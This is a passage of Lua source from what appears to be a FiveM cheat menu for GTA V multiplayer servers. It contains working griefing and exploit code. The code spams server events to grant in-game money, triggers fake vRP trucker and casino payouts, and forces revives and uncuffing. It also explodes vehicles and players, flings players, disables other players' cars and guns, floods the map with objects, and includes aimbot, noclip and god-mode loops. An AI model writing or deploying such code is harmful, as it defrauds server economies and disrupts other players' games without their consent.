                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if Back2 then
					SetVehicleDoorOpen(vehicle, 7, nil, true)
                elseif not Back2 then
					SetVehicleDoorShut(vehicle, 7, true)
                end
            end

        -- VEHICLE OPTIONS
    WarMenu.CreateSubMenu('vehicle', 'skid', 'Vehicle Options')

    WarMenu.CreateSubMenu('vehiclespawner', 'vehicle', 'Vehicle Spawner')
-- יצירת תת תפריט "vehicle control"
WarMenu.CreateSubMenu('vehiclecontrol', 'vehicle', 'Vehicle Control')

    WarMenu.CreateSubMenu('compacts', 'vehiclespawner', 'Compacts')
    WarMenu.CreateSubMenu('sedans', 'vehiclespawner', 'Sedans')
    WarMenu.CreateSubMenu('suvs', 'vehiclespawner', 'SUVs')
    WarMenu.CreateSubMenu('coupes', 'vehiclespawner', 'Coupes')
    WarMenu.CreateSubMenu('muscle', 'vehiclespawner', 'Muscle')
    WarMenu.CreateSubMenu('sportsclassics', 'vehiclespawner', 'Sports Classics')
    WarMenu.CreateSubMenu('sports', 'vehiclespawner', 'Sports')
    WarMenu.CreateSubMenu('super', 'vehiclespawner', 'Super')
    WarMenu.CreateSubMenu('motorcycles', 'vehiclespawner', 'Motorcycles')
    WarMenu.CreateSubMenu('offroad', 'vehiclespawner', 'Off-road')
    WarMenu.CreateSubMenu('industrial', 'vehiclespawner', 'Industrial')
    WarMenu.CreateSubMenu('utility', 'vehiclespawner', 'Utility')
    WarMenu.CreateSubMenu('vans', 'vehiclespawner', 'Vans')
    WarMenu.CreateSubMenu('cycles', 'vehiclespawner', 'Cycles')
    WarMenu.CreateSubMenu('boats', 'vehiclespawner', 'Boats')
    WarMenu.CreateSubMenu('helicopters', 'vehiclespawner', 'Helicopters')
    WarMenu.CreateSubMenu('planes', 'vehiclespawner', 'Planes')
    WarMenu.CreateSubMenu('service', 'vehiclespawner', 'Service')
    WarMenu.CreateSubMenu('commercial', 'vehiclespawner', 'Commercial')

    WarMenu.CreateSubMenu('vehiclemods', 'vehicle', 'Vehicle Mods')
    WarMenu.CreateSubMenu('vehiclecolors', 'vehiclemods', 'Vehicle Colors')
    WarMenu.CreateSubMenu('vehiclecolors_primary', 'vehiclecolors', 'Primary Color')
    WarMenu.CreateSubMenu('primary_classic', 'vehiclecolors_primary', 'Classic')
    WarMenu.CreateSubMenu('primary_matte', 'vehiclecolors_primary', 'Matte')
    WarMenu.CreateSubMenu('primary_metal', 'vehiclecolors_primary', 'Metals')
    WarMenu.CreateSubMenu('vehiclecolors_secondary', 'vehiclecolors', 'Secondary Color')
    WarMenu.CreateSubMenu('secondary_classic', 'vehiclecolors_secondary', 'Classic')
    WarMenu.CreateSubMenu('secondary_matte', 'vehiclecolors_secondary', 'Matte')
    WarMenu.CreateSubMenu('secondary_metal', 'vehiclecolors_secondary', 'Metals')
    WarMenu.CreateSubMenu('vehicletuning', 'vehiclemods', 'Tuning')

    WarMenu.CreateSubMenu('vehiclemenu', 'vehicle', 'Vehicle Control')
    WarMenu.CreateSubMenu('vehiclemods', 'vehicle', 'Vehicle Mods')
    WarMenu.CreateSubMenu('vehiclecolors', 'vehiclemods', 'Vehicle Colors')
    WarMenu.CreateSubMenu('vehiclecolors_primary', 'vehiclecolors', 'Primary Color')
    WarMenu.CreateSubMenu('primary_classic', 'vehiclecolors_primary', 'Classic')
    WarMenu.CreateSubMenu('primary_matte', 'vehiclecolors_primary', 'Matte')
    WarMenu.CreateSubMenu('primary_metal', 'vehiclecolors_primary', 'Metals')
    WarMenu.CreateSubMenu('vehiclecolors_secondary', 'vehiclecolors', 'Secondary Color')
    WarMenu.CreateSubMenu('secondary_classic', 'vehiclecolors_secondary', 'Classic')
    WarMenu.CreateSubMenu('secondary_matte', 'vehiclecolors_secondary', 'Matte')
    WarMenu.CreateSubMenu('secondary_metal', 'vehiclecolors_secondary', 'Metals')
    WarMenu.CreateSubMenu('vehicletuning', 'vehiclemods', 'Tuning')

   

  

    -- WORLD OPTIONS MENU
        elseif WarMenu.IsMenuOpened('world') then
            if WarMenu.Button("Sound Player") then
                PlaySoundPlayer()
            end
            if WarMenu.Button("PedAttack") then
                PedAttack(GetPlayerPed(-1), "WEAPON_CARBINERIFLE")
            end

if WarMenu.Button("Destroy Mode: " .. destroyMode) then
    if destroyMode == "safe" then
        destroyMode = "quick"
    else
        destroyMode = "safe"
    end
end

         if WarMenu.Button("~r~Destroy ~w~the screen everyone near you") then
    if destroyMode == "safe" then
        ConfirmDestroyScreenSafe()
    else
        ConfirmDestroyScreenQuick()
    end
end

            if WarMenu.MenuButton("Object Spawner", 'objectspawner') then
            elseif WarMenu.MenuButton("Weather Changer ~r~(CLIENT SIDE)", 'weather') then
            elseif WarMenu.MenuButton("Time Changer", 'time') then
            elseif WarMenu.Button("Set All Nearby Vehicles Plate Text") then
            local plateInput = GetKeyboardInput("Enter Plate Text (8 Characters):")
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                SetVehicleNumberPlateText(k, plateInput)
            end
            elseif WarMenu.CheckBox("Disable Cars", CarsDisabled) then
                CarsDisabled = not CarsDisabled
            elseif WarMenu.CheckBox("Disable Guns", GunsDisabled) then
                GunsDisabled = not GunsDisabled
            elseif WarMenu.CheckBox("Clear Streets", ClearStreets) then
                ClearStreets = not ClearStreets
            elseif WarMenu.CheckBox("Noisy Cars", NoisyCars) then
                NoisyCars = not NoisyCars
                if not NoisyCars then
                    for k in EnumerateVehicles() do
                        SetVehicleAlarmTimeLeft(k, 0)
                    end
                end
            elseif WarMenu.CheckBox("Make All Cars Fly", FlyingCars) then
                FlyingCars = not FlyingCars
            elseif WarMenu.ComboBoxSlider("Gravity Amount", GravityOpsWords, currGravIndex, selGravIndex, function(currentIndex, selectedIndex)
                currGravIndex = currentIndex
                selGravIndex = currentIndex
                GravAmount = GravityOps[currGravIndex]

                for k in EnumerateVehicles() do
                    RequestControlOnce(k)
                    SetVehicleGravityAmount(k, GravAmount)
                end
            end) then
            elseif WarMenu.CheckBox("Set The World On ~r~Fire", WorldOnFire) then
                WorldOnFire = not WorldOnFire
                if WorldOnFire then
                    wofDUI = CreateDui("https://tinyurl.com/y6e2qu9e", 1, 1)
                else
                    DestroyDui(wofDUI)
                end
            elseif WarMenu.Button("~r~Fuck Up The Map (Irreversible!)  [WIP]") then
                if not FuckMap then
                    ShowInfo("~b~Fucking Up Map")
                    FuckMap = true
                else
                    ShowInfo("~r~Map Already Fucked")
                end
			end
        
        
        -- OBJECT SPAWNER MENU
        elseif WarMenu.IsMenuOpened('objectspawner') then
            if WarMenu.MenuButton("Spawned Objects", 'objectlist') then
            elseif WarMenu.ComboBox("Object To Spawn", objs_tospawn, currObjIndex, selObjIndex, function(currentIndex, selectedIndex)
				currObjIndex = currentIndex
				selObjIndex = currentIndex
				obj = objs_tospawn[currObjIndex]
				end) then
            elseif WarMenu.Button("Add Object By Name") then
				local testObj = GetKeyboardInput("Enter Object Model Name:")
				local pos = GetEntityCoords(PlayerPedId())
				local addedObj = CreateObject(GetHashKey(testObj), pos.x, pos.y, pos.z - 100, 0, 1, 1)
				SetEntityVisible(addedObj, 0, 0)
				if table.contains(objs_tospawn, testObj) then
					ShowInfo("~b~Model " .. testObj .. " is already spawnable!")
				elseif DoesEntityExist(addedObj) then
					objs_tospawn[#objs_tospawn + 1] = testObj
					ShowInfo("~g~Model " .. testObj .. " has been added to the list!")
				else
					ShowInfo("~r~Model " .. testObj .. " does not exist!")
				end
				RequestControlOnce(addedObj)
				DeleteObject(addedObj)
            elseif WarMenu.CheckBox("Visible", objVisible) then
                objVisible = not objVisible
            elseif WarMenu.ComboBox("Direction", {"front", "back"}, currDirectionIndex, selDirectionIndex, function(currentIndex, selectedIndex)
                currDirectionIndex = currentIndex
                selDirectionIndex = currentIndex
            end) then
            elseif WarMenu.ComboBox("Rotation", RotationOps, currRotationIndex, selRotationIndex, function(currentIndex, selectedIndex)
				currRotationIndex = currentIndex
				selRotationIndex = currentIndex
				ObjRotation = RotationOps[currRotationIndex]
				end) then
            elseif WarMenu.Button("Spawn Object") then
				local pos = GetEntityCoords(PlayerPedId())
				local pitch = GetEntityPitch(PlayerPedId())
				local roll = GetEntityRoll(PlayerPedId())
				local yaw = GetEntityRotation(PlayerPedId()).z
				local xf = GetEntityForwardX(PlayerPedId())
				local yf = GetEntityForwardY(PlayerPedId())
				local spawnedObj = nil
				if currDirectionIndex == 1 then
					spawnedObj = CreateObject(GetHashKey(obj), pos.x + (xf * 10), pos.y + (yf * 10), pos.z - 1, 1, 1, 1)
				elseif currDirectionIndex == 2 then
					spawnedObj = CreateObject(GetHashKey(obj), pos.x - (xf * 10), pos.y - (yf * 10), pos.z - 1, 1, 1, 1)
				end
				SetEntityRotation(spawnedObj, pitch, roll, yaw + ObjRotation)
				SetEntityVisible(spawnedObj, objVisible, 0)
				FreezeEntityPosition(spawnedObj, 1)
				table.insert(SpawnedObjects, spawnedObj)
            end
        
        
        -- SPAWNED OBJECTS MENU
        elseif WarMenu.IsMenuOpened('objectlist') then
            if WarMenu.Button("Delete All Spawned Objects") then for i = 1, #SpawnedObjects do RequestControlOnce(SpawnedObjects[i])DeleteObject(SpawnedObjects[i]) end
            else
                for i = 1, #SpawnedObjects do
                    if DoesEntityExist(SpawnedObjects[i]) then
                        if WarMenu.Button("OBJECT [" .. i .. "] WITH ID " .. SpawnedObjects[i]) then
                            RequestControlOnce(SpawnedObjects[i])
                            DeleteObject(SpawnedObjects[i])
                        end
                    end
                end
            end
        
        -- WEATHER CHANGER MENU
		elseif WarMenu.IsMenuOpened('weather') then
		    if WarMenu.ComboBox("Weather Type", WeathersList, currWeatherIndex, selWeatherIndex, function(currentIndex, selectedIndex)
                    	 currWeatherIndex = currentIndex
                    	 selWeatherIndex = currentIndex
                    	 WeatherType = WeathersList[currentIndex]
		    end) then
		    elseif WarMenu.CheckBox("Weather Changer", WeatherChanger, "Disabled", "Enabled") then
		  	  WeatherChanger = not WeatherChanger
		    end
		
        -- MISC OPTIONS MENU
        elseif WarMenu.IsMenuOpened('misc') then
    if WarMenu.CheckBox("Freecam", cam_active, "Off", "On") then toggle_camera() end
        if WarMenu.Button('Sound Player') then SoundPlayer() end
            if WarMenu.ComboBox('Theme', themes, currThemeIndex, selThemeIndex, function(currentIndex, selectedIndex)
                currThemeIndex = currentIndex
                selThemeIndex = selectedIndex
            end) then theme = themes[selThemeIndex]WarMenu.InitializeTheme()
			elseif WarMenu.MenuButton("Keybindings", 'keybindings') then
            elseif WarMenu.MenuButton("Visual Options", 'visualoptions') then    
            elseif WarMenu.CheckBox('Force Map', ForceMap) then
                ForceMap = not ForceMap
                elseif WarMenu.MenuButton("Menu Position", 'menuPosition') then
                elseif WarMenu.Button("Spawn RC Car") then
    StartRCCar()
            elseif WarMenu.CheckBox('Force Third Person', ForceThirdPerson) then
                ForceThirdPerson = not ForceThirdPerson
                  elseif WarMenu.MenuButton("~r~[18+] Emotes", 'adultemotes') then
  
			elseif WarMenu.MenuButton("Web Radio", 'webradio') then
            elseif WarMenu.CheckBox("Portable Radio", Radio, "Disabled", "Enabled") then
                Radio = not Radio
                ShowInfo("~r~Portable Radio will override any vehicle's radio!")
            elseif WarMenu.ComboBox2("Change Radio Station", RadiosListWords, currRadioIndex, selRadioIndex, function(currentIndex, selectedIndex)
                -- If Radio (above) == true, whenever a ped enters a vehicle, the station selected on this combobox will override the vehicle's station
                -- If Radio (above) == false, the values of this combobox will update depending on what station the player chooses using the GtaV radio selection
                currRadioIndex = currentIndex
                selRadioIndex = currentIndex
                RadioStation = RadiosList[currentIndex]
            end) then
            elseif WarMenu.CheckBox('Always Draw Crosshair', Crosshair) then
                Crosshair = not Crosshair
            elseif WarMenu.CheckBox("Show Coordinates", ShowCoords) then
                ShowCoords = not ShowCoords
            elseif WarMenu.MenuButton('Credits', 'credits') then
            end
					
		
			
		-- KEYBINDS MENU
		elseif WarMenu.IsMenuOpened('keybindings') then
			if WarMenu.CheckBox("Menu Keybind:", 0, menuKeybind, menuKeybind) then
				local key = string.upper(GetKeyboardInput("Input New Key Name (line 1316)"))
				
				if Keys[key] then
					menuKeybind = key
					ShowInfo("Menu bind has been set to ~g~"..key)
				else
					ShowInfo("~r~Key "..key.." is not valid!")
				end
			elseif WarMenu.CheckBox("Noclip Keybind:", 0, noclipKeybind, noclipKeybind) then
				local key = string.upper(GetKeyboardInput("Input New Key Name (line 1316)"))
				
				if Keys[key] then
					noclipKeybind = key
					ShowInfo("Noclip bind has been set to ~g~"..key)
				else
					ShowInfo("~r~Key "..key.." is not valid!")
				end
			elseif WarMenu.CheckBox("Fix Vehicle Keybind:", 0, fixcarKeybind, fixcarKeybind) then
				local key = string.upper(GetKeyboardInput("Input New Key Name (line 1316)"))
				
				if Keys[key] then
					fixcarKeybind = key
					ShowInfo("FixVeh bind has been set to ~g~"..key)
				else
					ShowInfo("~r~Key "..key.." is not valid!")
				end
			elseif WarMenu.CheckBox("Heal Self Keybind:", 0, healplayerKeybind, healplayerKeybind) then
				local key = string.upper(GetKeyboardInput("Input New Key Name (line 1316)"))
				
				if Keys[key] then
					healplayerKeybind = key
					ShowInfo("Heal Self bind has been set to ~g~"..key)
				else
					ShowInfo("~r~Key "..key.." is not valid!")
				end
			end
		-- WEB RADIO MENU
        elseif WarMenu.IsMenuOpened('webradio') then
            if WarMenu.CheckBox("Classical", ClassicalRadio, "Status: Not Playing", "Status: Playing") then
				ClassicalRadio = not ClassicalRadio
				if ClassicalRadio then
					RadioDUI = CreateDui("http://cms.stream.publicradio.org/cms.mp3", 1, 1)
					ShowInfo("~b~Now Playing...")
				else
					DestroyDui(RadioDUI)
					ShowInfo("~r~Web Radio Stopped!")
				end
			end
       
        -- TELEPORT OPTIONS MENU
        elseif WarMenu.IsMenuOpened('teleport') then
            if WarMenu.MenuButton('Save/Load Position', 'saveload') then
            elseif WarMenu.MenuButton('Teleport to POI', 'pois') then
            elseif WarMenu.Button('Teleport To Waypoint') then
				TeleportToWaypoint()
            end
        
        -- SAVE/LOAD POSITION MENU
        elseif WarMenu.IsMenuOpened('saveload') then
            if WarMenu.ComboBox("Saved Location 1", {"save", "load"}, currSaveLoadIndex1, selSaveLoadIndex1, function(currentIndex, selectedIndex)
                currSaveLoadIndex1 = currentIndex
                selSaveLoadIndex1 = currentIndex
            end) then
                if selSaveLoadIndex1 == 1 then
                    savedpos1 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 1 Saved")
                else
                    if not savedpos1 then ShowInfo("~r~There is no saved position for slot 1!") else
                        SetEntityCoords(PlayerPedId(), savedpos1)
                        ShowInfo("~g~Position 1 Loaded")
                    end
                end
            elseif WarMenu.ComboBox("Saved Location 2", {"save", "load"}, currSaveLoadIndex2, selSaveLoadIndex2, function(currentIndex, selectedIndex)
                currSaveLoadIndex2 = currentIndex
                selSaveLoadIndex2 = currentIndex
            end) then
                if selSaveLoadIndex2 == 1 then
                    savedpos2 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 2 Saved")
                else
                    if not savedpos2 then ShowInfo("~r~There is no saved position for slot 2!") else
                        SetEntityCoords(PlayerPedId(), savedpos2)
                        ShowInfo("~g~Position 2 Loaded")
                    end
                end
            elseif WarMenu.ComboBox("Saved Location 3", {"save", "load"}, currSaveLoadIndex3, selSaveLoadIndex3, function(currentIndex, selectedIndex)
                currSaveLoadIndex3 = currentIndex
                selSaveLoadIndex3 = currentIndex
            end) then
                if selSaveLoadIndex3 == 1 then
                    savedpos3 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 3 Saved")
                else
                    if not savedpos3 then ShowInfo("~r~There is no saved position for slot 3!") else
                        SetEntityCoords(PlayerPedId(), savedpos3)
                        ShowInfo("~g~Position 3 Loaded")
                    end
                end
            elseif WarMenu.ComboBox("Saved Location 4", {"save", "load"}, currSaveLoadIndex4, selSaveLoadIndex4, function(currentIndex, selectedIndex)
                currSaveLoadIndex4 = currentIndex
                selSaveLoadIndex4 = currentIndex
            end) then
                if selSaveLoadIndex4 == 1 then
                    savedpos4 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 4 Saved")
                else
                    if not savedpos4 then ShowInfo("~r~There is no saved position for slot 4!") else
                        SetEntityCoords(PlayerPedId(), savedpos4)
                        ShowInfo("~g~Position 4 Loaded")
                    end
                end
            elseif WarMenu.ComboBox("Saved Location 5", {"save", "load"}, currSaveLoadIndex5, selSaveLoadIndex5, function(currentIndex, selectedIndex)
                currSaveLoadIndex5 = currentIndex
                selSaveLoadIndex5 = currentIndex
            end) then
                if selSaveLoadIndex5 == 1 then
                    savedpos5 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 5 Saved")
                else
                    if not savedpos5 then ShowInfo("~r~There is no saved position for slot 5!") else
                        SetEntityCoords(PlayerPedId(), savedpos5)
                        ShowInfo("~g~Position 5 Loaded")
                    end
                end
            end
        
        -- TELEPORT TO POIs MENU
        elseif WarMenu.IsMenuOpened('pois') then
            if WarMenu.Button("Car Dealership (Simeon's)") then
                SetEntityCoords(PlayerPedId(), -3.812, -1086.427, 26.672)
            elseif WarMenu.Button("Legion Square") then
                        SetEntityCoords(PlayerPedId(), 212.685, -920.016, 30.692)
            elseif WarMenu.Button("Grove Street") then
                SetEntityCoords(PlayerPedId(), 118.63, -1956.388, 20.669)
            elseif WarMenu.Button("LSPD HQ") then
                SetEntityCoords(PlayerPedId(), 436.873, -987.138, 30.69)
            elseif WarMenu.Button("Sandy Shores BCSO HQ") then
                SetEntityCoords(PlayerPedId(), 1864.287, 3690.687, 34.268)
            elseif WarMenu.Button("Paleto Bay BCSO HQ") then
                SetEntityCoords(PlayerPedId(), -424.13, 5996.071, 31.49)
            elseif WarMenu.Button("FIB Top Floor") then
                SetEntityCoords(PlayerPedId(), 135.835, -749.131, 258.152)
            elseif WarMenu.Button("FIB Offices") then
                SetEntityCoords(PlayerPedId(), 136.008, -765.128, 242.152)
            elseif WarMenu.Button("Michael's House") then
                SetEntityCoords(PlayerPedId(), -801.847, 175.266, 72.845)
            elseif WarMenu.Button("Franklin's First House") then
                SetEntityCoords(PlayerPedId(), -17.813, -1440.008, 31.102)
            elseif WarMenu.Button("Franklin's Second House") then
                SetEntityCoords(PlayerPedId(), -6.25, 522.043, 174.628)
            elseif WarMenu.Button("Trevor's Trailer") then
                SetEntityCoords(PlayerPedId(), 1972.972, 3816.498, 32.95)
            elseif WarMenu.Button("Tequi-La-La") then
                SetEntityCoords(PlayerPedId(), -568.25, 291.261, 79.177)
            end
        
        
        -- LUA OPTIONS MENU
        elseif WarMenu.IsMenuOpened('lua') then
            if WarMenu.MenuButton('ESX Options', 'esx') then
                elseif WarMenu.MenuButton('vRP Options', 'vrp') then
                elseif WarMenu.MenuButton('Other', 'other') then
                    end
        
        
        -- ESX OPTIONS
        elseif WarMenu.IsMenuOpened('esx') then
            if WarMenu.Button("~g~1M Cash") then
                ShowInfo("Adding 1M Cash...")
                Citizen.CreateThread(function()
                    for i = 0, 200 do
                        TriggerServerEvent('utk_fh:rewardCash', -1)
                        Wait(0)
                    end
                    ShowInfo("~g~1M Cash added successfully!")
                end)
            elseif WarMenu.Button("~b~ESX ~w~Restore Hunger") then
                TriggerEvent("esx_status:set", "hunger", 1000000)
            elseif WarMenu.Button("~b~ESX ~w~Restore Thirst") then
                TriggerEvent("esx_status:set", "thirst", 1000000)
            elseif WarMenu.Button("~b~ESX ~w~Revive Self") then
                TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(PlayerId()))
   elseif WarMenu.Button("~b~ESX ~w~Revive Self2") then
TriggerEvent("wasabi_ambulance:revive")
 elseif WarMenu.Button("~b~ESX ~w~Revive Self3 + ~r~QB ") then
   TriggerEvent("hospital:client:Revive") 
 elseif WarMenu.Button("~b~ESX ~w~Uncuff / Unfreeze") then
    Citizen.CreateThread(function()
    while true do
        local playerPed = PlayerPedId() 
        ClearPedSecondaryTask(playerPed)
        SetEnableHandcuffs(playerPed, false)
        DisablePlayerFiring(playerPed, false)
        SetPedCanPlayGestureAnims(playerPed, false)
        FreezeEntityPosition(playerPed, false)
        DisableControlAction(0, 24, false) 
        DisableControlAction(0, 257, false) 
        DisableControlAction(0, 25, false) 
        DisableControlAction(0, 263, false) 
        DisableControlAction(0, 44, false) 
        DisableControlAction(0, 37, false)
        DisableControlAction(0, 23, false) 
        DisableControlAction(0, 288, false) 
        DisableControlAction(0, 289, true) 
        DisableControlAction(0, 170, false)
        DisableControlAction(0, 167, false)
        DisableControlAction(0, 73, false) 
        DisableControlAction(2, 199, false) 
        DisableControlAction(0, 59, false) 
        DisableControlAction(0, 71, false) 
        DisableControlAction(0, 72, false) 
        DisableControlAction(2, 36, false) 
        DisableControlAction(0, 47, false)  
        DisableControlAction(0, 264, false) 
        DisableControlAction(0, 257, false) 
        DisableControlAction(0, 140, false) 
        DisableControlAction(0, 141, false) 
        DisableControlAction(0, 142, false) 
        DisableControlAction(0, 143, false) 
        DisableControlAction(0, 75, false)  
        DisableControlAction(27, 75, false) 
        
        Citizen.Wait(0) 
    end
end)
                        Citizen.CreateThread(function()
                            while true do
                                Citizen.Wait(0) 
                                EnableAllControlActions(0)
                                EnableAllControlActions(1)
                            end
                        end)
                        Citizen.CreateThread(function()
                            while true do
                                Citizen.Wait(0) 
                                
                                
                                local playerPed = PlayerPedId()
                                if IsPedInAnyVehicle(playerPed, false) then
                                    local vehicle = GetVehiclePedIsIn(playerPed, false)
                        
                                    
                                    local maxSpeed = 100.0 
                                    SetEntityMaxSpeed(vehicle, maxSpeed)
                                    SetVehicleEnginePowerMultiplier(vehicle, 1.0) 
                                    SetVehicleEngineTorqueMultiplier(vehicle, 1.0) 
                                end
                            end
                        end)
            elseif WarMenu.Button("~b~ESX ~w~Revive By ID") then
                local serverID = GetKeyboardInput("Enter Player Server ID:")
                TriggerServerEvent('esx_ambulancejob:revive', serverID)
            end
        
        
        --- VRP Options
        elseif WarMenu.IsMenuOpened('vrp') then
            if WarMenu.Button("~r~vRP ~w~Toggle Handcuffs") then
                vRP.toggleHandcuff()
-- OTHER LUA
        elseif WarMenu.IsMenuOpened('other') then
            if WarMenu.Button("Gang Outfit") then
                ApplyGangOutfit()
            end
            elseif WarMenu.Button("~r~vRP ~w~Clear Wanted Level") then
                vRP.applyWantedLevel(0)
            elseif WarMenu.Button("~r~ vRP ~w~Give Money (vrp_trucker)") then
                local money = GetKeyboardInput("Enter $ Amount:")
                local distance = money / 3.80 -- money is distance*3.80
                vRPtruckS = Tunnel.getInterface("vRP_trucker", "vRP_trucker")
                vRPtruckS.finishTruckingDelivery({distance})
			elseif WarMenu.Button("~r~ vRP ~w~Give Casino Chips (vrp_casino)") then
				local amount = GetKeyboardInput("Enter Chips Amount:")
				vRPcasinoS = Tunnel.getInterface("vRP_casino","vRP_casino")
				vRPcasinoS.payRouletteWinnings({amount, 2})
            end
        
        -- CREDITS
        elseif WarMenu.IsMenuOpened('credits') then
            for i = 1, #developers do if WarMenu.Button(developers[i]) then end end
                
        
        -- OPEN MENU
        elseif IsDisabledControlJustReleased(0, Keys[menuKeybind]) then WarMenu.OpenMenu('skid')-- Change keys in config, not here
        
        
        -- TOGGLE NOCLIP (KEYBIND)
        elseif IsDisabledControlJustReleased(0, Keys[noclipKeybind]) then 
			ToggleNoclip()
        
		-- Fix vehicle (keybind)
		elseif IsDisabledControlJustReleased(0, Keys[fixcarKeybind]) then 
			FixVeh(GetVehiclePedIsIn(PlayerPedId(), 0)) 
			ShowInfo("Vehicle ~g~Fixed!")
		
		-- Heal self (keybing)
		elseif IsDisabledControlJustReleased(0, Keys[healplayerKeybind]) then
			SetEntityHealth(PlayerPedId(), 200.0)
			ShowInfo("Player ~g~Healed!")
			
		end
		


        
        WarMenu.Display()
        
        -- LOOP HANDLING
        if Demigod then
            if GetEntityHealth(PlayerPedId()) < 200 then
                SetEntityHealth(PlayerPedId(), 200)
            end
        end
        
        if ADemigod then
            SetEntityHealth(PlayerPedId(), 189.9)
        end
        
        if NeverWanted then
            ClearPlayerWantedLevel(PlayerId())
        end
        
        if Noclipping then
            local isInVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)
            local k = nil
            local x, y, z = nil
            
            if not isInVehicle then
                k = PlayerPedId()
                x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 2))
            else
                k = GetVehiclePedIsIn(PlayerPedId(), 0)
                x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 1))
            end
            
            if isInVehicle and GetSeatPedIsIn(PlayerPedId()) ~= -1 then RequestControlOnce(k) end
            
            local dx, dy, dz = GetCamDirection()
            SetEntityVisible(PlayerPedId(), 0, 0)
            SetEntityVisible(k, 0, 0)
            
            SetEntityVelocity(k, 0.0001, 0.0001, 0.0001)
            
            if IsDisabledControlJustPressed(0, Keys["LEFTSHIFT"]) then -- Change speed
                oldSpeed = NoclipSpeed
                NoclipSpeed = NoclipSpeed * 2
            end
            if IsDisabledControlJustReleased(0, Keys["LEFTSHIFT"]) then -- Restore speed
                NoclipSpeed = oldSpeed
            end
            
            if IsDisabledControlPressed(0, 32) then -- MOVE FORWARD
                x = x + NoclipSpeed * dx
                y = y + NoclipSpeed * dy
                z = z + NoclipSpeed * dz
            end
            
            if IsDisabledControlPressed(0, 269) then -- MOVE BACK
                x = x - NoclipSpeed * dx
                y = y - NoclipSpeed * dy
                z = z - NoclipSpeed * dz
            end
			
			if IsDisabledControlPressed(0, Keys["SPACE"]) then -- MOVE UP
                z = z + NoclipSpeed
            end
            
			if IsDisabledControlPressed(0, Keys["LEFTCTRL"]) then -- MOVE DOWN
                z = z - NoclipSpeed
            end
            
            
            SetEntityCoordsNoOffset(k, x, y, z, true, true, true)
        end
        
        if ExplodingAll then
            ExplodeAll(includeself)
        end
        
        if Tracking then
            local coords = GetEntityCoords(GetPlayerPed(TrackedPlayer))
            SetNewWaypoint(coords.x, coords.y)
        end
        
		if FlingingPlayer then
			local coords = GetEntityCoords(GetPlayerPed(FlingedPlayer))
			Citizen.InvokeNative(0xE3AD2BDBAEE269AC, coords.x, coords.y, coords.z, 4, 1.0, 0, 1, 0.0, 1)
		end
		
        if InfStamina then
            RestorePlayerStamina(PlayerId(), GetPlayerSprintStaminaRemaining(PlayerId()))
        end

        if SuperJump then
            SetSuperJumpThisFrame(PlayerId())
        end
        
        if Invisibility then
            SetEntityVisible(PlayerPedId(), 0, 0)
        end
        
        if Forcefield then
            DoForceFieldTick(ForcefieldRadius)
        end
        
        if CarsDisabled then
            local plist = GetActivePlayers()
            for i = 1, #plist do
                if IsPedInAnyVehicle(GetPlayerPed(plist[i]), true) then
                    ClearPedTasksImmediately(GetPlayerPed(plist[i]))
                end
            end
        end
        
        if GunsDisabled then
            local plist = GetActivePlayers()
            for i = 1, #plist do
                if IsPedShooting(GetPlayerPed(plist[i])) then
                    ClearPedTasksImmediately(GetPlayerPed(plist[i]))
                end
            end
        end
        
        if NoisyCars then
            for k in EnumerateVehicles() do
                SetVehicleAlarmTimeLeft(k, 500)
            end
        end
        
        if FlyingCars then
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                ApplyForceToEntity(k, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
            end
        end
        
        if SuperGravity then
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                SetVehicleGravityAmount(k, GravAmount)
            end
        end
        
        if WorldOnFire then
            local pos = GetEntityCoords(PlayerPedId())
            local k = GetRandomVehicleInSphere(pos, 100.0, 0, 0)
            if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) then
                local targetpos = GetEntityCoords(k)
                local x, y, z = table.unpack(targetpos)
                local expposx = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x
                local expposy = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y
                local expposz = math.random(math.floor(z - 0.5), math.ceil(z + 1.5)) % z
                AddExplosion(expposx, expposy, expposz, 1, 1.0, 1, 0, 0.0)
                AddExplosion(expposx, expposy, expposz, 4, 1.0, 1, 0, 0.0)
            end
            
            for v in EnumeratePeds() do
                if v ~= PlayerPedId() then
                    local targetpos = GetEntityCoords(v)
                    local x, y, z = table.unpack(targetpos)
                    local expposx = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x
                    local expposy = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y
                    local expposz = math.random(math.floor(z), math.ceil(z + 1.5)) % z
                    AddExplosion(expposx, expposy, expposz, 1, 1.0, 1, 0, 0.0)
                    AddExplosion(expposx, expposy, expposz, 4, 1.0, 1, 0, 0.0)
                end
            end
        end
        
        if FuckMap then
            for i = -4000.0, 8000.0, 3.14159 do
                local _, z1 = GetGroundZFor_3dCoord(i, i, 0, 0)
                local _, z2 = GetGroundZFor_3dCoord(-i, i, 0, 0)
                local _, z3 = GetGroundZFor_3dCoord(i, -i, 0, 0)
                
                CreateObject(GetHashKey("stt_prop_stunt_track_start"), i, i, z1, 0, 1, 1)
                CreateObject(GetHashKey("stt_prop_stunt_track_start"), -i, i, z2, 0, 1, 1)
                CreateObject(GetHashKey("stt_prop_stunt_track_start"), i, -i, z3, 0, 1, 1)
            end
        end
        
        if ClearStreets then
            SetVehicleDensityMultiplierThisFrame(0.0)
            SetRandomVehicleDensityMultiplierThisFrame(0.0)
            SetParkedVehicleDensityMultiplierThisFrame(0.0)
            SetAmbientVehicleRangeMultiplierThisFrame(0.0)
            SetPedDensityMultiplierThisFrame(0.0)
        end
        
        if RapidFire then
            DoRapidFireTick()
        end
        
        if Aimbot then
            
            -- Draw FOV
            if DrawFov then
                DrawRect(0.25, 0.5, 0.01, 0.515, 255, 80, 80, 100)
